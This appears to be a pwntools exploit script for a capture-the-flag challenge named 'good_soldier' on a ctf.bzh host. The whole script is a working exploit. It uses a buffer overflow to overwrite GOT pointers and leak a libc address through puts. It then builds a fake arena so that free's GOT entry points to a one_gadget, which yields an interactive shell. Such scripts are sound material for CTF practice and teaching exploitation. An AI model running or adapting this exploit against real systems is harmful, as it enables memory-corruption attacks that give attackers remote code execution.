#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('../src/build/good_soldier')
context.terminal = ['tmux', 'splitw', '-h']
libc = elf.libc

HOST = "good-soldier-136.chall.ctf.bzh"
PORT = 1337
DELAY = 0.1 if args.REMOTE else 0

gs = """
b *arena_destroy
continue
"""
if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = gdb.debug(elf.path, gdbscript=gs, cwd="../src/") if args.GDB else process(cwd="../src")

context.log_level = 'info'

# STEP 1 : Use the overflow to leak libc
io.sendlineafter(b'> ', b'foobar')
io.recvuntil(b'do ?')
io.sendlineafter(b'> ', b'2')

payload = b'A'*256 + p64(elf.got["__libc_start_main"]) + p64(elf.got["free"] - elf.got["__libc_start_main"]) + p64(1000)
io.sendlineafter(b'> ', payload)
io.sendlineafter(b': ', p64(elf.plt["puts"]))
libc.address = unpack(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym["__libc_start_main"]
info("libc @ " + hex(libc.address))
io.sendlineafter(b'?\n', b'y')

# STEP 2 : Use the overflow to get shell
io.sendlineafter(b'> ', b'foobar')
io.recvuntil(b'do ?')
io.sendlineafter(b'> ', b'2')

offset_arena = 256
fake_arena = p64(elf.got["free"]) + p64(0) + p64(0x20) 
payload = b'A'*9 + p64(0) + b'A'*(offset_arena-17) + fake_arena

one_gadget = libc.address + 0xe1225

io.sendlineafter(b'> ', payload)
io.sendlineafter(b': ', p64(one_gadget))

io.interactive()
